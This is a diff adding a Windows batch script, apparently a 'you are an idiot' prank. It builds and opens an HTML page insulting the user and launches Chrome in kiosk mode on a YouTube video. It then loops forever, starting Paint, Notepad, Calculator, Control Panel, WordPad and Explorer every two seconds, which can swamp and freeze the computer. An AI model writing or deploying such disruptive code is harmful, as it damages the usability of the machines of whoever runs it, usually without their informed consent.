@@ -1,0 +1,51 @@
+@echo off
+:: Crear el archivo HTML con el mensaje
+echo ^<!DOCTYPE html^> > idiot.html
+echo ^<html lang="en"^> >> idiot.html
+echo ^<head^> >> idiot.html
+echo     ^<meta charset="utf-8" /^> >> idiot.html
+echo     ^<title^>You are an idiot^</title^> >> idiot.html
+echo     ^<style^> >> idiot.html
+echo         body { >> idiot.html
+echo             margin: 0; >> idiot.html
+echo             padding: 0; >> idiot.html
+echo             font-family: Comic Sans; >> idiot.html
+echo             font-weight: bold; >> idiot.html
+echo             font-size: 16px; >> idiot.html
+echo         } >> idiot.html
+echo         #idiot-text { >> idiot.html
+echo             display: block; >> idiot.html
+echo             padding: 1em; >> idiot.html
+echo             text-align: center; >> idiot.html
+echo             font-size: 4em; >> idiot.html
+echo         } >> idiot.html
+echo     ^</style^> >> idiot.html
+echo ^</head^> >> idiot.html
+echo ^<body^> >> idiot.html
+echo     ^<div id="idiot-text"^>You are an idiot of maicrof wal! Ah, ha, ha, ha, ha, ha, ha, ha, ha, ha.^</div^> >> idiot.html
+echo ^</body^> >> idiot.html
+echo ^</html^> >> idiot.html
+
+:: Abrir el archivo HTML en el navegador predeterminado
+start "" "idiot.html"
+
+:: Esperar 2 segundos
+timeout /t 2 >nul
+
+:: Iniciar el video de YouTube en modo kiosko
+start chrome --kiosk --app=https://youtu.be/8So3SA2uJvo?si=6CtRDZe8SYuvj0Hx
+
+:: Esperar 2 segundos
+timeout /t 2 >nul
+
+:repeat
+:: Abrir varias aplicaciones repetidamente
+start mspaint
+start notepad
+start calc
+start control
+start write
+start explorer
+timeout /t 2 >nul
+
+goto repeat
